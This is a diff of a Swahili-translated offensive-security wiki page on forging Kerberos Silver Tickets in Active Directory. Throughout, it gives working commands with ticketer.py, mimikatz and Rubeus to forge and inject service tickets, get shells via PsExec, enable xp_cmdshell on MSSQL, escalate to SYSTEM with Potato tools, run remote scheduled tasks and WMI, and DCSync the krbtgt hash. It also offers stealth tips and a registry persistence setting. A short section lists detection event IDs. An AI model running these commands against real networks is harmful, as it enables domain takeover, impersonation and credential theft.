@@ -6,45 +6,64 @@
 
 ## Silver ticket
 
-Shambulio la **Silver Ticket** linahusisha matumizi mabaya ya service tickets katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya akaunti ya huduma**, kama vile akaunti ya kompyuta, ili kutengeneza Ticket Granting Service (TGS) ticket. Kwa tiketi hii iliyotengenezwa kwa ulaghai, mshambuliaji anaweza kupata huduma maalum kwenye mtandao, **kuigiza mtumiaji yoyote**, kwa kawaida akilenga vibali vya kiutawala. Inasisitizwa kwamba kutumia AES keys kwa kutengeneza tiketi ni salama zaidi na inayotambulika kwa ukosefu mdogo.
+Shambulio la **Silver Ticket** linahusisha matumizi mabaya ya service tickets katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya service account**, kama computer account, ili kuforge Ticket Granting Service (TGS) ticket. Kwa ticket hii iliyoforgwa, mshambulizi anaweza kufikia huduma maalumu kwenye mtandao, **kuiga mtumiaji yeyote**, kwa kawaida akilenga vibali vya usimamizi. Inasisitizwa kwamba kutumia AES keys katika kutengeneza tickets ni salama zaidi na ngumu kugunduliwa.
 
 > [!WARNING]
-> Silver Tickets ni ngumu kugunduliwa kuliko Golden Tickets kwa sababu zinahitaji tu **hash ya akaunti ya huduma**, si akaunti ya krbtgt. Hata hivyo, zina kikomo kwa huduma maalum wanayolenga. Pia, hata kuiba tu nenosiri la mtumiaji kunaweza kutosha.
-> Zaidi ya hayo, ikiwa utapora **nenosiri la akaunti lenye SPN** unaweza kutumia nenosiri hilo kutengeneza Silver Ticket inayomfanya mtu awe mtumiaji yoyote kwa huduma hiyo.
+> Silver Tickets ni ngumu kugundua kuliko Golden Tickets kwa sababu zinahitaji tu **hash of the service account**, si krbtgt account. Hata hivyo, zina mipaka kwa huduma maalumu wanayolenga. Kwa mfano, kwa kuiba tu nywila ya account, au ikiwa unapata **account's password with a SPN**, unaweza kutumia nywila hiyo kutengeneza Silver Ticket kuiga mtumiaji yeyote kwa huduma hiyo.
 
-Kwa kutengeneza tiketi, zana mbalimbali zinatumika kulingana na mfumo wa uendeshaji:
+### Modern Kerberos changes (AES-only domains)
 
-### On Linux
+- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
+- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
+- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
+- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` dakika) to avoid detection by abnormal lifetimes.
+
+Kwa kutengeneza ticket, zana tofauti zinatumiwa kulingana na mfumo wa uendeshaji:
+
+### Kwenye Linux
 ```bash
-python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
+# Forge with AES instead of RC4 (supports gMSA/machine accounts)
+python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+-spn <SERVICE_PRINCIPAL_NAME> <USER>
+# or read key directly from a keytab (useful when only keytab is obtained)
+python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>
+
+# shorten validity for stealth
+python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+-spn cifs/<HOST_FQDN> -duration 480 <USER>
+
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### Kwenye Windows
 ```bash
-# Using Rubeus
-## /ldap option is used to get domain data automatically
-## With /ptt we already load the tickt in memory
-rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
+# /ldap option is used to get domain data automatically
+rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
+/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd
 
-# Create the ticket
-mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
+# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
+mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
+/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
+# RC4 still works only if the DC and service accept RC4
+mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
+/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
 
-# Inject the ticket
+# Inject an already forged kirbi
 mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 .\Rubeus.exe ptt /ticket:<TICKET_FILE>
 
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Huduma ya CIFS imeangaziwa kama lengo la kawaida la kupata mfumo wa faili wa mwathiriwa, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumiwa kwa ajili ya kazi na maswali ya WMI.
+Huduma ya CIFS imeangaziwa kama lengo la kawaida la kupata mfumo wa faili wa mwathirika, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumika kwa ajili ya kazi na maombi ya WMI.
 
 ### Mfano: huduma ya MSSQL (MSSQLSvc) + Potato hadi SYSTEM
 
-Ikiwa una hash ya NTLM (au ufunguo wa AES) wa akaunti ya huduma ya SQL (mfano, sqlsvc), unaweza kutengeneza TGS kwa MSSQL SPN na kuiga mtumiaji yeyote kwa huduma ya SQL. Kutoka hapo, wezesha xp_cmdshell ili kutekeleza amri kama akaunti ya huduma ya SQL. Ikiwa token hiyo ina SeImpersonatePrivilege, fanya mnyororo wa Potato ili kuinua cheo hadi SYSTEM.
+Ikiwa una NTLM hash (au AES key) ya akaunti ya huduma ya SQL (kwa mfano, sqlsvc) unaweza kutengeneza TGS kwa SPN ya MSSQL na kujifanya mtumiaji yeyote kwa huduma ya SQL. Kutoka hapo, wezesha xp_cmdshell ili kutekeleza amri kama akaunti ya huduma ya SQL. Ikiwa token hiyo ina SeImpersonatePrivilege, chain a Potato ili kuinua hadi SYSTEM.
 ```bash
-# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
-python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+# Forge a silver ticket for MSSQLSvc (AES example)
+python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
 -spn MSSQLSvc/<host.fqdn>:1433 administrator
 export KRB5CCNAME=$PWD/administrator.ccache
 
@@ -52,20 +71,20 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Ikiwa muktadha uliopatikana una SeImpersonatePrivilege (mara nyingi kweli kwa service accounts), tumia Potato variant ili kupata SYSTEM:
+- Ikiwa muktadha uliopatikana una SeImpersonatePrivilege (mara nyingi ni kweli kwa service accounts), tumia variant ya Potato ili kupata SYSTEM:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-Maelezo zaidi kuhusu kutumia MSSQL na kuwezesha xp_cmdshell:
+Maelezo zaidi juu ya kutumia vibaya MSSQL na kuwezesha xp_cmdshell:
 
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
-Muhtasari wa mbinu za Potato:
+Potato techniques overview:
 
 {{#ref}}
 ../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
@@ -73,38 +92,40 @@ Muhtasari wa mbinu za Potato:
 
 ## Huduma Zinazopatikana
 
-| Aina ya Huduma                            | Service Silver Tickets                                                     |
+| Service Type                               | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Kwa baadhi ya wakati unaweza kuomba tu: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
 | Windows File Share, also psexec            | CIFS                                                                       |
 | LDAP operations, included DCSync           | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+Kwa kutumia **Rubeus** unaweza kuomba zote hizi tiketi kwa kutumia parameter:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Vitambulisho vya Tukio
+### Event IDs za Silver tickets
 
-- 4624: Kuingia kwa Akaunti
-- 4634: Kutoka kwa Akaunti
-- 4672: Kuingia kwa Admin
+- 4624: Account Logon
+- 4634: Account Logoff
+- 4672: Admin Logon
+- **No preceding 4768/4769 on the DC** for the same client/service is a common indicator of a forged TGS being presented directly to the service.
+- Abnormally long ticket lifetime or unexpected encryption type (RC4 when domain enforces AES) also stand out in 4769/4624 data.
 
 ## Uendelevu
 
-Ili kuzuia mashine zizungushe nywila zao kila 30 days weka `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` au unaweza kuweka `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` kuwa thamani kubwa kuliko 30days ili kuonyesha kipindi cha mzunguko ambapo nywila ya mashine inapaswa kugeuzwa.
+Ili kuzuia mashine kubadilisha nywila zao kila siku 30 seti `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` au unaweza kuweka `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` kwa thamani kubwa kuliko 30days kuonyesha kipindi cha mzunguko ambacho nywila ya mashine inapaswa kubadilishwa.
 
-## Kutumia tikiti za huduma
+## Kutumia vibaya Service tickets
 
-Katika mifano ifuatayo hebu tufikirie kuwa tikiti imetolewa kwa kuiga akaunti ya msimamizi.
+Katika mifano ifuatayo tuchukue kuwa tiketi imepatikana kwa kujifanya kuwa na akaunti ya administrator.
 
 ### CIFS
 
-Ukitumia tikiti hii utaweza kupata ufikivu kwenye folda `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na kunakili faili kwenye sehemu ya mfumo wa faili ya mbali kwa kufanya kitu kama:
+Kwa tiketi hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na kunakili faili sehemu ya mfumo wa faili wa mbali kwa kufanya kitu kama:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
@@ -118,7 +139,7 @@ Pia utaweza kupata shell ndani ya host au kutekeleza amri zozote kwa kutumia **p
 
 ### HOST
 
-Kwa ruhusa hii unaweza kuunda scheduled tasks kwenye remote computers na execute arbitrary commands:
+Kwa ruhusa hii unaweza kuunda scheduled tasks kwenye remote computers na kutekeleza amri zozote:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -132,7 +153,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathiri**:
+Kwa tikiti hizi unaweza **kutekeleza WMI kwenye mfumo wa mwathiriwa**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -142,7 +163,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Pata **maelezo zaidi kuhusu wmiexec** kwenye ukurasa ufuatao:
+Pata **habari zaidi kuhusu wmiexec** katika ukurasa ufuatao:
 
 
 {{#ref}}
@@ -155,8 +176,7 @@ Kwa ufikiaji wa winrm kwenye kompyuta unaweza **kuifikia** na hata kupata PowerS
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Angalia ukurasa ufuatao ili kujifunza **njia zaidi za kuunganisha na mwenyeji wa mbali kutumia winrm**:
-
+Tazama ukurasa ufuatao ili ujifunze **njia zaidi za kuungana na mwenyeji wa mbali kwa kutumia winrm**:
 
 {{#ref}}
 ../lateral-movement/winrm.md
@@ -167,11 +187,11 @@ Angalia ukurasa ufuatao ili kujifunza **njia zaidi za kuunganisha na mwenyeji wa
 
 ### LDAP
 
-Kwa ruhusa hii unaweza dump hifadhidata ya DC ukitumia **DCSync**:
+Kwa ruhusa hii unaweza dump database ya DC ukitumia **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**Jifunze zaidi kuhusu DCSync** kwenye ukurasa ufuatao:
+**Jifunze zaidi kuhusu DCSync** katika ukurasa ufuatao:
 
 
 {{#ref}}
@@ -179,12 +199,14 @@ dcsync.md
 {{#endref}}
 
 
-## Marejeleo
+## Marejeo
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 - [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
+- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
 
 
 
